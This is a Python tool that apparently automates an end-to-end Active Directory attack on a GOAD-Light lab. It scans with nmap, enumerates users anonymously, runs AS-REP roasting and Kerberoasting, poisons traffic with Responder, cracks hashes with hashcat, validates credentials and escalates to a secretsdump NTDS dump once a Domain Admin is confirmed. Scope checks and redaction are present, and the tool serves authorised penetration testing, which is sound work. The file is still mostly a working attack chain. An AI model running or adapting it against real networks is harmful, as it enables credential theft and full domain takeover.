#!/usr/bin/env python3
"""Discovery-driven Active Directory assessment runner for an isolated lab."""

from __future__ import annotations

import argparse
import datetime as dt
import gzip
import hashlib
import ipaddress
import json
import os
import re
import shlex
import shutil
import stat
import subprocess
import sys
import tempfile
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Any, Iterable


ROOT = Path(__file__).resolve().parent
CONFIG = ROOT / "config" / "goad-light.env"
LOOT = ROOT / "loot"
STATE_DIR = ROOT / "state"
REPORTS = ROOT / "reports"
STATE_FILE = STATE_DIR / "assessment.json"
EVENTS_FILE = STATE_DIR / "events.jsonl"
VERSION = "2.0.0"


class AssessmentError(RuntimeError):
    pass


def utc_stamp() -> str:
    return dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")


def utc_iso() -> str:
    return dt.datetime.now(dt.timezone.utc).replace(microsecond=0).isoformat()


def ensure_dirs() -> None:
    old = os.umask(0o077)
    try:
        for directory in (LOOT, STATE_DIR, REPORTS):
            directory.mkdir(parents=True, exist_ok=True)
            directory.chmod(0o700)
    finally:
        os.umask(old)


def parse_env(path: Path) -> dict[str, str]:
    values: dict[str, str] = {}
    for raw in path.read_text(encoding="utf-8").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        values[key.strip()] = value.strip().strip('"').strip("'")
    return values


def new_state(scope: str) -> dict[str, Any]:
    return {
        "version": VERSION,
        "scope": scope,
        "created_at": utc_iso(),
        "updated_at": utc_iso(),
        "local_interfaces": [],
        "hosts": {},
        "domains": {},
        "users": {},
        "hashes": [],
        "credentials": [],
        "access": [],
        "domain_admins": [],
        "collections": [],
        "ntds_proofs": [],
    }


def load_state(scope: str) -> dict[str, Any]:
    if not STATE_FILE.exists():
        return new_state(scope)
    state = json.loads(STATE_FILE.read_text(encoding="utf-8"))
    if state.get("scope") != scope:
        raise AssessmentError("stored assessment scope does not match the configured lab scope")
    for key, default in new_state(scope).items():
        state.setdefault(key, default)
    return state


def save_state(state: dict[str, Any]) -> None:
    state["updated_at"] = utc_iso()
    handle, temp_name = tempfile.mkstemp(prefix="assessment-", suffix=".json", dir=STATE_DIR)
    try:
        with os.fdopen(handle, "w", encoding="utf-8") as stream:
            json.dump(state, stream, indent=2, sort_keys=True)
            stream.write("\n")
        os.chmod(temp_name, 0o600)
        os.replace(temp_name, STATE_FILE)
    finally:
        if os.path.exists(temp_name):
            os.unlink(temp_name)


def record_event(stage: str, status: str, detail: str) -> None:
    event = {"time": utc_iso(), "stage": stage, "status": status, "detail": detail}
    with EVENTS_FILE.open("a", encoding="utf-8") as stream:
        stream.write(json.dumps(event, sort_keys=True) + "\n")
    EVENTS_FILE.chmod(0o600)


def redact(text: str, secrets: Iterable[str]) -> str:
    for secret in sorted((s for s in secrets if s), key=len, reverse=True):
        text = text.replace(secret, "[REDACTED]")
    return text


def tool(*names: str) -> str | None:
    for name in names:
        resolved = shutil.which(name)
        if resolved:
            return resolved
    return None


def require_tool(*names: str) -> str:
    resolved = tool(*names)
    if not resolved:
        raise AssessmentError(f"missing required tool: {' or '.join(names)}")
    return resolved


def command_label(args: list[str], secrets: Iterable[str] = ()) -> str:
    return redact(" ".join(shlex.quote(part) for part in args), secrets)


def run(
    args: list[str],
    stage: str,
    *,
    secrets: Iterable[str] = (),
    check: bool = False,
    timeout: int | None = None,
    log_name: str | None = None,
    cwd: Path | None = None,
) -> subprocess.CompletedProcess[str]:
    secret_list = list(secrets)
    print(f"[*] {stage}: {command_label(args, secret_list)}")
    try:
        result = subprocess.run(args, text=True, capture_output=True, timeout=timeout, check=False, cwd=cwd)
        combined = (result.stdout or "") + (result.stderr or "")
    except subprocess.TimeoutExpired as exc:
        combined = (exc.stdout or "") + (exc.stderr or "")
        result = subprocess.CompletedProcess(args, 124, combined, "")
    safe = redact(combined, secret_list)
    if safe:
        print(safe, end="" if safe.endswith("\n") else "\n")
    if log_name:
        log_path = LOOT / log_name
        log_path.write_text(safe, encoding="utf-8")
        log_path.chmod(0o600)
    record_event(stage, "ok" if result.returncode == 0 else "failed", f"exit={result.returncode}")
    if check and result.returncode != 0:
        raise AssessmentError(f"{stage} failed with exit code {result.returncode}")
    return subprocess.CompletedProcess(args, result.returncode, safe, "")


def parse_nmap_xml(path: Path) -> dict[str, dict[str, Any]]:
    hosts: dict[str, dict[str, Any]] = {}
    root = ET.parse(path).getroot()
    for node in root.findall("host"):
        status = node.find("status")
        if status is not None and status.get("state") != "up":
            continue
        address = next((a.get("addr") for a in node.findall("address") if a.get("addrtype") == "ipv4"), None)
        if not address:
            continue
        names = [n.get("name", "") for n in node.findall("hostnames/hostname") if n.get("name")]
        ports: dict[str, dict[str, str]] = {}
        for port_node in node.findall("ports/port"):
            state_node = port_node.find("state")
            if state_node is None or state_node.get("state") != "open":
                continue
            service = port_node.find("service")
            ports[port_node.get("portid", "")] = {
                "protocol": port_node.get("protocol", "tcp"),
                "service": service.get("name", "unknown") if service is not None else "unknown",
                "product": service.get("product", "") if service is not None else "",
                "version": service.get("version", "") if service is not None else "",
            }
        hosts[address] = {"ip": address, "hostnames": names, "ports": ports, "last_seen": utc_iso()}
    return hosts


def network_interfaces(network: ipaddress.IPv4Network) -> list[dict[str, str]]:
    ip_cmd = require_tool("ip")
    result = run([ip_cmd, "-j", "-4", "addr", "show"], "local-interface-discovery", log_name="interfaces.json")
    if result.returncode != 0:
        raise AssessmentError("could not inspect local network interfaces")
    entries = json.loads(result.stdout)
    matches: list[dict[str, str]] = []
    for entry in entries:
        for addr in entry.get("addr_info", []):
            if addr.get("family") != "inet":
                continue
            candidate = ipaddress.ip_address(addr["local"])
            if candidate in network:
                matches.append({"interface": entry["ifname"], "address": str(candidate), "prefix": str(addr["prefixlen"])})
    return matches


def interface_is_lab_only(interface: str, network: ipaddress.IPv4Network) -> bool:
    ip_cmd = require_tool("ip")
    result = subprocess.run([ip_cmd, "-j", "-4", "addr", "show", "dev", interface], text=True, capture_output=True)
    if result.returncode != 0:
        return False
    entries = json.loads(result.stdout or "[]")
    addresses = [ipaddress.ip_address(a["local"]) for e in entries for a in e.get("addr_info", []) if a.get("family") == "inet"]
    return bool(addresses) and all(address in network for address in addresses)


def merge_hosts(state: dict[str, Any], discovered: dict[str, dict[str, Any]]) -> None:
    for ip, current in discovered.items():
        previous = state["hosts"].get(ip, {"ip": ip, "hostnames": [], "ports": {}})
        previous["hostnames"] = sorted(set(previous.get("hostnames", []) + current.get("hostnames", [])))
        previous["ports"].update(current.get("ports", {}))
        previous["last_seen"] = current.get("last_seen", utc_iso())
        state["hosts"][ip] = previous


def recon(state: dict[str, Any], network: ipaddress.IPv4Network) -> None:
    nmap = require_tool("nmap")
    interfaces = network_interfaces(network)
    if not interfaces:
        raise AssessmentError(f"no local interface is connected to authorized scope {network}")
    state["local_interfaces"] = interfaces
    stamp = utc_stamp()
    discovery_xml = LOOT / f"discovery-{stamp}.xml"
    run([nmap, "-sn", "-oX", str(discovery_xml), str(network)], "host-discovery", check=True, log_name=f"discovery-{stamp}.log")
    discovered = parse_nmap_xml(discovery_xml)
    local_ips = {item["address"] for item in interfaces}
    presence_xml = LOOT / f"service-presence-{stamp}.xml"
    run(
        [
            nmap,
            "-Pn",
            "--open",
            "-p",
            "53,80,88,135,139,389,443,445,636,1433,3268,3269,3389,5985,5986,9389",
            "-oX",
            str(presence_xml),
            str(network),
        ],
        "service-presence-sweep",
        check=True,
        log_name=f"service-presence-{stamp}.log",
    )
    presence = {ip: host for ip, host in parse_nmap_xml(presence_xml).items() if host.get("ports")}
    discovered.update(presence)
    targets = sorted((ip for ip in discovered if ip not in local_ips), key=ipaddress.ip_address)
    if not targets:
        raise AssessmentError("host discovery found no non-local systems in the authorized scope")

    ports_xml = LOOT / f"ports-{stamp}.xml"
    run(
        [nmap, "-Pn", "-p-", "--open", "-T4", "--min-rate", "800", "-oX", str(ports_xml), *targets],
        "full-tcp-port-discovery",
        check=True,
        log_name=f"ports-{stamp}.log",
    )
    port_hosts = parse_nmap_xml(ports_xml)
    open_ports = sorted({int(port) for host in port_hosts.values() for port in host.get("ports", {})})
    if open_ports:
        services_xml = LOOT / f"services-{stamp}.xml"
        run(
            [nmap, "-Pn", "-sV", "-sC", "-p", ",".join(map(str, open_ports)), "-oX", str(services_xml), *targets],
            "service-fingerprinting",
            check=True,
            log_name=f"services-{stamp}.log",
        )
        merge_hosts(state, parse_nmap_xml(services_xml))
    else:
        merge_hosts(state, discovered)
    merge_hosts(state, port_hosts)
    save_state(state)
    record_event("recon", "ok", f"live_targets={len(targets)} open_ports={len(open_ports)}")


def dc_candidates(state: dict[str, Any]) -> list[str]:
    result = []
    for ip, host in state["hosts"].items():
        ports = {int(port) for port in host.get("ports", {})}
        if 88 in ports and 389 in ports:
            result.append(ip)
    return sorted(result, key=ipaddress.ip_address)


def dn_to_domain(value: str) -> str | None:
    parts = re.findall(r"(?i)(?:^|,)DC=([^,]+)", value)
    return ".".join(parts).lower() if parts else None


def add_user(state: dict[str, Any], domain: str, username: str, source: str) -> None:
    username = username.strip().strip("[]").lower()
    domain = domain.strip().lower()
    if not re.fullmatch(r"[a-z0-9._$-]{1,128}", username):
        return
    if username.lower() in {"administrator", "guest", "krbtgt"}:
        pass
    bucket = state["users"].setdefault(domain, [])
    existing = next((entry for entry in bucket if entry["username"] == username), None)
    if existing:
        existing["sources"] = sorted(set(existing.get("sources", []) + [source]))
    else:
        bucket.append({"username": username, "sources": [source]})
        bucket.sort(key=lambda item: item["username"])


def parse_ldif_values(text: str, key: str) -> list[str]:
    return [match.group(1).strip() for match in re.finditer(rf"(?im)^{re.escape(key)}:\s*(.+)$", text)]


def anonymous_enumeration(state: dict[str, Any]) -> None:
    candidates = dc_candidates(state)
    if not candidates:
        raise AssessmentError("no domain-controller candidates were identified; run recon first")
    ldapsearch = tool("ldapsearch")
    rpcclient = tool("rpcclient")
    nxc = tool("nxc", "netexec")
    enum4linux = tool("enum4linux-ng")
    stamp = utc_stamp()

    for dc in candidates:
        discovered_domain: str | None = None
        base_dn: str | None = None
        hostname: str | None = None
        if ldapsearch:
            root = run(
                [ldapsearch, "-LLL", "-x", "-H", f"ldap://{dc}", "-s", "base", "-b", "", "defaultNamingContext", "rootDomainNamingContext", "dnsHostName"],
                f"rootdse-{dc}",
                log_name=f"rootdse-{dc}-{stamp}.log",
            )
            bases = parse_ldif_values(root.stdout, "defaultNamingContext")
            names = parse_ldif_values(root.stdout, "dnsHostName")
            if bases:
                base_dn = bases[0]
                discovered_domain = dn_to_domain(base_dn)
            if names:
                hostname = names[0].lower()
        if discovered_domain and base_dn:
            state["domains"][discovered_domain] = {
                "dc": dc,
                "base_dn": base_dn,
                "hostname": hostname or "",
                "source": "anonymous RootDSE",
            }
            if hostname:
                host = state["hosts"].setdefault(dc, {"ip": dc, "hostnames": [], "ports": {}})
                host["hostnames"] = sorted(set(host.get("hostnames", []) + [hostname]))
            if ldapsearch:
                users = run(
                    [ldapsearch, "-LLL", "-x", "-H", f"ldap://{dc}", "-b", base_dn, "(&(objectCategory=person)(objectClass=user))", "sAMAccountName"],
                    f"anonymous-ldap-users-{dc}",
                    log_name=f"anonymous-ldap-users-{dc}-{stamp}.log",
                )
                for username in parse_ldif_values(users.stdout, "sAMAccountName"):
                    add_user(state, discovered_domain, username, "anonymous LDAP")

        rpc_output = ""
        if rpcclient:
            rpc = run([rpcclient, "-U", "", "-N", "-c", "enumdomusers", dc], f"null-rpc-users-{dc}", log_name=f"rpc-users-{dc}-{stamp}.log")
            rpc_output = rpc.stdout
            domain_for_rpc = discovered_domain or f"unknown@{dc}"
            for username in re.findall(r"(?i)user:\[([^\]]+)\]", rpc_output):
                add_user(state, domain_for_rpc, username, "null-session SAMR")

        if nxc:
            nxc_result = run([nxc, "smb", dc, "-u", "", "-p", "", "--users"], f"null-smb-users-{dc}", log_name=f"nxc-null-users-{dc}-{stamp}.log")
            domain_for_nxc = discovered_domain or f"unknown@{dc}"
            for username in re.findall(r"(?im)^SMB\s+\S+\s+\d+\s+\S+\s+([^\s\\]+\\)?([A-Za-z0-9._$-]+)\s+", nxc_result.stdout):
                add_user(state, domain_for_nxc, username[1], "null-session SMB")

        if enum4linux:
            run([enum4linux, "-A", dc], f"enum4linux-{dc}", log_name=f"enum4linux-{dc}-{stamp}.log")

    save_state(state)
    record_event("anonymous-enumeration", "ok", f"domains={len(state['domains'])} users={sum(len(v) for v in state['users'].values())}")


def add_hash(state: dict[str, Any], kind: str, path: Path, domain: str = "") -> None:
    resolved = str(path.resolve())
    if not any(entry["path"] == resolved for entry in state["hashes"]):
        state["hashes"].append({"kind": kind, "path": resolved, "domain": domain, "cracked": False, "discovered_at": utc_iso()})


def asrep_discovered_users(state: dict[str, Any]) -> None:
    getnp = require_tool("impacket-GetNPUsers", "GetNPUsers.py")
    stamp = utc_stamp()
    attempted = 0
    for domain, info in state["domains"].items():
        users = [entry["username"] for entry in state["users"].get(domain, [])]
        if not users:
            continue
        dc = info["dc"]
        users_file = STATE_DIR / f"users-{hashlib.sha256(domain.encode()).hexdigest()[:10]}.txt"
        users_file.write_text("\n".join(users) + "\n", encoding="utf-8")
        users_file.chmod(0o600)
        output = LOOT / f"asrep-{domain}-{stamp}.txt"
        run(
            [getnp, f"{domain}/", "-dc-ip", dc, "-usersfile", str(users_file), "-no-pass", "-format", "hashcat", "-outputfile", str(output)],
            f"asrep-{domain}",
            log_name=f"asrep-{domain}-{stamp}.log",
        )
        attempted += 1
        if output.exists() and "$krb5asrep$" in output.read_text(encoding="utf-8", errors="ignore"):
            output.chmod(0o600)
            add_hash(state, "asrep", output, domain)
    if not attempted:
        record_event("asrep", "skipped", "no discovered domain/user pairs")
    save_state(state)


def responder_capture(state: dict[str, Any], network: ipaddress.IPv4Network, interface: str, seconds: int) -> None:
    responder = require_tool("responder")
    timeout_cmd = require_tool("timeout")
    sudo = require_tool("sudo")
    if not interface_is_lab_only(interface, network):
        raise AssessmentError(f"interface {interface!r} is absent or has an IPv4 address outside {network}")
    if not 30 <= seconds <= 900:
        raise AssessmentError("Responder duration must be between 30 and 900 seconds")
    stamp = utc_stamp()
    result = run(
        [sudo, timeout_cmd, "--signal=INT", str(seconds), responder, "-I", interface, "-dwv"],
        "bounded-responder-capture",
        timeout=seconds + 30,
        log_name=f"responder-{stamp}.log",
    )
    if result.returncode not in (0, 124, 130):
        raise AssessmentError("Responder exited unexpectedly; inspect the saved log")
    collect_responder(state)


def collect_responder(state: dict[str, Any]) -> None:
    lines: set[str] = set()
    locations = [Path("/usr/share/responder/logs"), Path("/opt/Responder/logs"), ROOT / "Responder" / "logs"]
    pattern = re.compile(r"^[^:]+::[^:]+:[0-9A-Fa-f]{16}:[0-9A-Fa-f]+:")
    for directory in locations:
        if not directory.is_dir():
            continue
        for path in directory.glob("*NTLMv2*"):
            try:
                content = path.read_text(encoding="utf-8", errors="ignore")
            except PermissionError:
                sudo = tool("sudo")
                if not sudo:
                    continue
                elevated = subprocess.run([sudo, "cat", str(path)], text=True, capture_output=True, check=False)
                if elevated.returncode != 0:
                    continue
                content = elevated.stdout
            for line in content.splitlines():
                if pattern.match(line):
                    lines.add(line.strip())
    if not lines:
        record_event("collect-responder", "empty", "no readable NetNTLMv2 captures")
        return
    output = LOOT / f"netntlmv2-{utc_stamp()}.txt"
    output.write_text("\n".join(sorted(lines)) + "\n", encoding="utf-8")
    output.chmod(0o600)
    add_hash(state, "netntlmv2", output)
    for line in lines:
        fields = line.split(":")
        if len(fields) > 2:
            add_user(state, fields[2].lower(), fields[0].lower(), "Responder capture")
    save_state(state)
    record_event("collect-responder", "ok", f"captures={len(lines)} output={output}")


def parse_cracked(kind: str, line: str) -> tuple[str, str, str] | None:
    if "|" not in line:
        return None
    hash_value, password = line.rsplit("|", 1)
    if not password:
        return None
    if kind == "asrep":
        match = re.search(r"\$krb5asrep\$\d+\$([^@:]+)@([^:]+):", hash_value, re.I)
    elif kind == "netntlmv2":
        match = re.match(r"([^:]+)::([^:]+):", hash_value, re.I)
    else:
        match = re.search(r"\$krb5tgs\$\d+\$\*?([^$*]+)\$([^$]+)\$", hash_value, re.I)
    if not match:
        return None
    return match.group(1).lower(), match.group(2).lower(), password


def add_credential(state: dict[str, Any], username: str, domain: str, password: str, source: str) -> None:
    if any(c["username"] == username and c["domain"] == domain and c["password"] == password for c in state["credentials"]):
        return
    state["credentials"].append(
        {"username": username, "domain": domain, "password": password, "source": source, "validated": False, "discovered_at": utc_iso()}
    )


def crack_hashes(state: dict[str, Any], wordlist: Path) -> None:
    hashcat = require_tool("hashcat")
    if not wordlist.is_file():
        raise AssessmentError(f"wordlist is not readable: {wordlist}")
    modes = {"asrep": "18200", "netntlmv2": "5600", "tgs": "13100"}
    for entry in state["hashes"]:
        path = Path(entry["path"])
        if entry.get("cracked") or not path.is_file() or entry["kind"] not in modes:
            continue
        outfile = LOOT / f"{path.stem}.cracked"
        result = run(
            [
                hashcat,
                "-m",
                modes[entry["kind"]],
                str(path),
                str(wordlist),
                "--potfile-path",
                str(STATE_DIR / "hashcat.potfile"),
                "--outfile",
                str(outfile),
                "--outfile-format",
                "1,2",
                "--separator",
                "|",
            ],
            f"crack-{entry['kind']}",
            log_name=f"crack-{path.stem}.log",
        )
        if outfile.exists():
            outfile.chmod(0o600)
            for line in outfile.read_text(encoding="utf-8", errors="ignore").splitlines():
                parsed = parse_cracked(entry["kind"], line)
                if parsed:
                    add_credential(state, *parsed, source=str(path))
            entry["cracked"] = True
        elif result.returncode == 0:
            entry["cracked"] = True
    save_state(state)


def matching_domain(state: dict[str, Any], label: str) -> tuple[str, dict[str, Any]] | None:
    normalized = label.lower()
    for domain, info in state["domains"].items():
        if normalized in {domain, domain.split(".")[0]}:
            return domain, info
    return None


def smb_targets(state: dict[str, Any]) -> list[str]:
    return sorted((ip for ip, host in state["hosts"].items() if "445" in host.get("ports", {})), key=ipaddress.ip_address)


def ldap_domain_admin_check(state: dict[str, Any], credential: dict[str, Any]) -> tuple[bool, str]:
    ldapsearch = tool("ldapsearch")
    matched = matching_domain(state, credential["domain"])
    if not ldapsearch or not matched:
        return False, "LDAP check unavailable"
    domain, info = matched
    base = info["base_dn"]
    dc = info["dc"]
    password_file = STATE_DIR / f".ldap-password-{os.getpid()}"
    password_file.write_text(credential["password"] + "\n", encoding="utf-8")
    password_file.chmod(0o600)
    group_dn = f"CN=Domain Admins,CN=Users,{base}"
    ldap_filter = (
        f"(&(objectCategory=person)(objectClass=user)(sAMAccountName={credential['username']})"
        f"(|(primaryGroupID=512)(memberOf:1.2.840.113556.1.4.1941:={group_dn})))"
    )
    try:
        schemes = ["ldaps"] if "636" in state["hosts"].get(dc, {}).get("ports", {}) else []
        schemes.append("ldap")
        for scheme in schemes:
            result = run(
                [ldapsearch, "-LLL", "-x", "-H", f"{scheme}://{dc}", "-D", f"{credential['username']}@{domain}", "-y", str(password_file), "-b", base, ldap_filter, "sAMAccountName"],
                f"domain-admin-check-{credential['username']}",
                secrets=[credential["password"]],
                log_name=f"domain-admin-check-{credential['username']}-{utc_stamp()}.log",
            )
            if re.search(rf"(?im)^sAMAccountName:\s*{re.escape(credential['username'])}\s*$", result.stdout):
                return True, f"recursive LDAP membership in Domain Admins on {dc}"
        return False, "not returned by the recursive Domain Admins LDAP query"
    finally:
        password_file.unlink(missing_ok=True)


def validate_credentials(state: dict[str, Any]) -> None:
    nxc = require_tool("nxc", "netexec")
    targets = smb_targets(state)
    if not targets:
        raise AssessmentError("no discovered SMB targets are available")
    for credential in state["credentials"]:
        if credential.get("validated"):
            continue
        matched = matching_domain(state, credential["domain"])
        domain = matched[0] if matched else credential["domain"]
        result = run(
            [nxc, "smb", *targets, "-d", domain, "-u", credential["username"], "-p", credential["password"]],
            f"credential-validation-{credential['username']}",
            secrets=[credential["password"]],
            log_name=f"validate-{credential['username']}-{utc_stamp()}.log",
        )
        credential["validated"] = bool(re.search(r"(?i)\[\+\]|Pwn3d!", result.stdout))
        for line in result.stdout.splitlines():
            ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line)
            if not ip_match or not re.search(r"(?i)\[\+\]|Pwn3d!", line):
                continue
            access = {
                "username": credential["username"],
                "domain": domain,
                "target": ip_match.group(0),
                "admin": bool(re.search(r"(?i)Pwn3d!", line)),
                "observed_at": utc_iso(),
            }
            if access not in state["access"]:
                state["access"].append(access)
        if credential["validated"]:
            is_da, evidence = ldap_domain_admin_check(state, credential)
            if is_da and not any(d["username"] == credential["username"] and d["domain"] == domain for d in state["domain_admins"]):
                state["domain_admins"].append(
                    {"username": credential["username"], "domain": domain, "evidence": evidence, "confirmed_at": utc_iso()}
                )
    save_state(state)


def kerberoast(state: dict[str, Any]) -> None:
    getspn = require_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
    for credential in state["credentials"]:
        if not credential.get("validated"):
            continue
        matched = matching_domain(state, credential["domain"])
        if not matched:
            continue
        domain, info = matched
        output = LOOT / f"tgs-{domain}-{credential['username']}-{utc_stamp()}.txt"
        run(
            [getspn, "-dc-ip", info["dc"], "-request", "-outputfile", str(output), f"{domain}/{credential['username']}:{credential['password']}"],
            f"kerberoast-{domain}-{credential['username']}",
            secrets=[credential["password"]],
            log_name=f"kerberoast-{domain}-{credential['username']}-{utc_stamp()}.log",
        )
        if output.exists() and "$krb5tgs$" in output.read_text(encoding="utf-8", errors="ignore"):
            output.chmod(0o600)
            add_hash(state, "tgs", output, domain)
    save_state(state)


def authenticated_collection(state: dict[str, Any]) -> None:
    bloodhound = tool("bloodhound-python")
    certipy = tool("certipy-ad")
    for credential in state["credentials"]:
        if not credential.get("validated"):
            continue
        matched = matching_domain(state, credential["domain"])
        if not matched:
            continue
        domain, info = matched
        marker = f"{domain}:{credential['username']}"
        if marker in state["collections"]:
            continue
        if bloodhound:
            run(
                [bloodhound, "-d", domain, "-u", credential["username"], "-p", credential["password"], "-ns", info["dc"], "-dc", info.get("hostname") or info["dc"], "-c", "All", "--zip"],
                f"bloodhound-{marker}",
                secrets=[credential["password"]],
                log_name=f"bloodhound-{credential['username']}-{utc_stamp()}.log",
                cwd=LOOT,
            )
        if certipy:
            run(
                [certipy, "find", "-u", f"{credential['username']}@{domain}", "-p", credential["password"], "-dc-ip", info["dc"], "-enabled", "-vulnerable", "-stdout"],
                f"certipy-{marker}",
                secrets=[credential["password"]],
                log_name=f"certipy-{credential['username']}-{utc_stamp()}.log",
            )
        state["collections"].append(marker)
    save_state(state)


def generate_report(state: dict[str, Any], name: str = "latest.md") -> Path:
    path = REPORTS / name
    lines = [
        "# Discovery driven Active Directory assessment",
        "",
        f"Generated: {utc_iso()}",
        "",
        f"Authorized scope: `{state['scope']}`",
        "",
        "## Discovered hosts",
        "",
        "| Address | Hostnames | Open TCP ports |",
        "| --- | --- | --- |",
    ]
    for ip in sorted(state["hosts"], key=ipaddress.ip_address):
        host = state["hosts"][ip]
        ports = ", ".join(f"{port}/{info.get('service', 'unknown')}" for port, info in sorted(host.get("ports", {}).items(), key=lambda item: int(item[0])))
        lines.append(f"| {ip} | {', '.join(host.get('hostnames', [])) or '-'} | {ports or '-'} |")
    lines.extend(["", "## Discovered domains", ""])
    if state["domains"]:
        for domain, info in sorted(state["domains"].items()):
            lines.append(f"- `{domain}` via `{info['dc']}` from {info['source']}")
    else:
        lines.append("No domains discovered.")
    lines.extend(["", "## Enumeration", ""])
    for domain, users in sorted(state["users"].items()):
        lines.append(f"- `{domain}`: {len(users)} discovered user names")
    lines.extend(["", "## Credential and access results", ""])
    lines.append(f"- Crackable artifacts: {len(state['hashes'])}")
    lines.append(f"- Recovered credentials: {len(state['credentials'])}")
    lines.append(f"- Validated access records: {len(state['access'])}")
    lines.append(f"- Confirmed Domain Admin principals: {len(state['domain_admins'])}")
    for entry in state["domain_admins"]:
        lines.append(f"  - `{entry['domain']}\\{entry['username']}`: {entry['evidence']}")
    lines.extend(["", "Passwords and reusable hashes are intentionally excluded from this report.", ""])
    path.write_text("\n".join(lines), encoding="utf-8")
    path.chmod(0o600)
    return path


def auto_assess(state: dict[str, Any], network: ipaddress.IPv4Network, interface: str | None, wordlist: Path, responder_seconds: int) -> None:
    if not state["hosts"]:
        recon(state, network)
    if not state["domains"]:
        anonymous_enumeration(state)
    if not state["credentials"]:
        asrep_discovered_users(state)
        crack_hashes(state, wordlist)
    if state["credentials"]:
        validate_credentials(state)
    if not state["domain_admins"] and not state["credentials"] and interface:
        responder_capture(state, network, interface, responder_seconds)
        crack_hashes(state, wordlist)
        validate_credentials(state)
    if not state["domain_admins"] and state["credentials"]:
        authenticated_collection(state)
        kerberoast(state)
        crack_hashes(state, wordlist)
        validate_credentials(state)
    report = generate_report(state)
    if state["domain_admins"]:
        print(f"[+] Domain Admin confirmed. Evidence report: {report}")
        record_event("auto", "domain-admin", f"report={report}")
    else:
        print(f"[!] Automated evidence paths are exhausted. Review BloodHound/Certipy output and {report}")
        record_event("auto", "needs-analysis", f"report={report}")


def default_wordlist() -> Path:
    candidates = [
        Path("/usr/share/wordlists/rockyou.txt"),
        Path("/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"),
    ]
    for candidate in candidates:
        if candidate.is_file():
            return candidate
    compressed = Path("/usr/share/wordlists/rockyou.txt.gz")
    if compressed.is_file():
        destination = STATE_DIR / "rockyou.txt"
        print(f"[*] expanding {compressed} to the protected state directory")
        with gzip.open(compressed, "rb") as source, destination.open("wb") as target:
            shutil.copyfileobj(source, target)
        destination.chmod(0o600)
        return destination
    raise AssessmentError(
        "no default wordlist found; install the Kali wordlists package"
    )


def choose_lab_interface(state: dict[str, Any], network: ipaddress.IPv4Network) -> str:
    interfaces = state.get("local_interfaces") or network_interfaces(network)
    if not interfaces:
        raise AssessmentError(f"no interface is connected to {network}")
    candidates = [entry["interface"] for entry in interfaces if interface_is_lab_only(entry["interface"], network)]
    if not candidates:
        raise AssessmentError("no dedicated lab interface passed the scope check")
    return sorted(set(candidates))[0]


def run_all(state: dict[str, Any], network: ipaddress.IPv4Network) -> None:
    wordlist = default_wordlist()
    print(f"[*] unattended assessment starting with wordlist {wordlist}")
    if not state["hosts"]:
        recon(state, network)
    interface = choose_lab_interface(state, network)
    print(f"[*] automatically selected lab interface {interface}")
    auto_assess(state, network, interface, wordlist, 420)
    if state["domain_admins"] and not state.get("ntds_proofs"):
        proof = dump_ntds(state)
        state["ntds_proofs"].append(str(proof))
        save_state(state)
        print(f"[+] NTDS evidence report: {proof}")
    final_report = generate_report(state)
    print(f"[+] final assessment report: {final_report}")


def dump_ntds(state: dict[str, Any]) -> Path:
    if not state["domain_admins"]:
        raise AssessmentError("no Domain Admin principal has been confirmed in discovered state")
    principal = state["domain_admins"][0]
    credential = next(
        (c for c in state["credentials"] if c["username"] == principal["username"] and matching_domain(state, c["domain"]) and matching_domain(state, c["domain"])[0] == principal["domain"]),
        None,
    )
    if not credential:
        raise AssessmentError("the confirmed Domain Admin credential is not available in the credential store")
    info = state["domains"][principal["domain"]]
    secretsdump = require_tool("impacket-secretsdump", "secretsdump.py")
    prefix = LOOT / f"ntds-{principal['domain']}-{utc_stamp()}"
    result = run(
        [secretsdump, "-just-dc-ntlm", "-outputfile", str(prefix), f"{principal['domain']}/{principal['username']}:{credential['password']}@{info['dc']}"],
        "ntds-replication-proof",
        secrets=[credential["password"]],
        log_name=f"ntds-{utc_stamp()}-transcript.log",
    )
    if result.returncode != 0:
        raise AssessmentError("NTDS replication proof failed")
    candidates = sorted(LOOT.glob(prefix.name + "*.ntds*"))
    if not candidates:
        raise AssessmentError("secretsdump returned success but no NTDS output was found")
    raw = candidates[0]
    raw.chmod(0o600)
    content = raw.read_text(encoding="utf-8", errors="ignore")
    count = len(re.findall(r"(?im)^[^:]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::", content))
    digest = hashlib.sha256(raw.read_bytes()).hexdigest()
    report = REPORTS / f"ntds-proof-{principal['domain']}-{utc_stamp()}.md"
    report.write_text(
        "\n".join(
            [
                "# NTDS replication proof",
                "",
                f"Generated: {utc_iso()}",
                f"Domain: `{principal['domain']}`",
                f"Domain controller: `{info['dc']}`",
                f"Discovered replication principal: `{principal['domain']}\\{principal['username']}`",
                f"NTLM records: **{count}**",
                f"krbtgt record present: **{'yes' if re.search(r'(?im)(^|\\\\)krbtgt:', content) else 'no'}**",
                f"Raw evidence SHA-256: `{digest}`",
                "",
                "The raw credential material is intentionally omitted from this report.",
                "",
            ]
        ),
        encoding="utf-8",
    )
    report.chmod(0o600)
    record_event("dump-ntds", "ok", f"records={count} sha256={digest} report={report}")
    return report


def doctor(network: ipaddress.IPv4Network) -> None:
    print(f"Domain Breaker {VERSION}")
    print(f"Authorized scope: {network}\n")
    groups = [
        ("ip",),
        ("nmap",),
        ("ldapsearch",),
        ("rpcclient",),
        ("nxc", "netexec"),
        ("impacket-GetNPUsers", "GetNPUsers.py"),
        ("impacket-GetUserSPNs", "GetUserSPNs.py"),
        ("hashcat",),
        ("responder",),
        ("bloodhound-python",),
        ("certipy-ad",),
        ("impacket-secretsdump", "secretsdump.py"),
    ]
    for names in groups:
        resolved = tool(*names)
        print(f"[{'ok' if resolved else 'missing'}] {'/'.join(names)}{f' -> {resolved}' if resolved else ''}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Discovery-driven AD assessment runner for an isolated GOAD-Light lab")
    sub = parser.add_subparsers(dest="command", required=True)
    sub.add_parser("run", help="run the complete unattended assessment and proof workflow")
    sub.add_parser("doctor")
    sub.add_parser("recon")
    sub.add_parser("enumerate")
    sub.add_parser("asrep")
    capture = sub.add_parser("responder")
    capture.add_argument("interface")
    capture.add_argument("--seconds", type=int, default=420)
